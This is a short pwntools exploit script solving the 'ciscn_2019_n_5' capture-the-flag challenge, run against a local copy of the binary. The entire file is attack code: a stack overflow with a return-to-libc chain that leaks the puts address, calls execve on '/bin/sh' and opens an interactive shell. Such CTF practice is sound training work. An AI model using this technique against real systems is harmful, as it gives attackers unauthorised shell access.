#coding:utf-8
from pwn import*
context(log_level = 'debug')
#io = remote ('node3.buuoj.cn',28715)
io = process ('./ciscn_2019_n_5')
#libc = ELF('/home/keer/桌面/PWN题/buuctf/libc.so/Ubuntu1864libc-2.27 (1).so')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
elf = ELF('./ciscn_2019_n_5')
poprdi = 0x400713
start = 0x400540
t = 1
pl = 'a'*0x28 + p64(poprdi) + p64(elf.got['puts'])+ p64(elf.plt['puts']) + p64(start)+'a'*0x1b
io.sendlineafter("your name\n",pl)
io.recvuntil('What do you want to say to me?\n')
io.sendline(pl)
libc_addr= u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
print hex(libc_addr)
sys = libc_addr + libc.sym['execve']
binsh = libc_addr + libc.search('/bin/sh\x00').next()
payload = 'a'*0x28 + p64(poprdi)+p64(binsh)+p64(sys)+p64(start)
io.sendline(payload)
gdb.attach(io,'b execve')
io.recvuntil('What do you want to say to me?\n')
io.sendline(payload)
io.interactive()